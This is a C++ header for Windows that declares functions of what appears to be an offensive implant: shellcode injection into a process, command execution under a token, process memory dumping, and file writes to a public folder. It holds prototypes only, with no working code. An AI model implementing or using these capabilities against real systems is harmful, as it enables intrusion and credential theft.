#pragma once
#include "pch.h"
#include <Windows.h>

#define MAX_DATA 40000
#define BUFSIZE 4096
#define PASS_FILE "C:\\Users\\Public\\"
#define SPLAT 47

// Function definitions
BOOL RunCommand(OUT LPVOID lpData, IN LPSTR Command, IN HANDLE phToken);
VOID InjectShellcode(OUT LPVOID lpData, IN LPSTR lpProc, IN LPSTR lpShellcode);
BOOL WriteBody(IN LPVOID lpInputData, IN LPSTR filePath);
BOOL FileWrite(IN LPVOID filePath, IN LPVOID data, OUT LPVOID lpOutData);
DWORD FileRead(IN LPSTR lpInData, OUT LPVOID& lpOutData);
VOID MemDump(OUT LPVOID lpOutData, IN LPSTR proc);